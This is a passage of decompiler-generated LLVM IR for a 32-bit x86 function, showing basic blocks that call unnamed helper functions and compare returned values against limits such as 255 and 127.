  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp148, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8052474.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_804f920()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80183, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb207, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp150, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_804f640(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp151, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
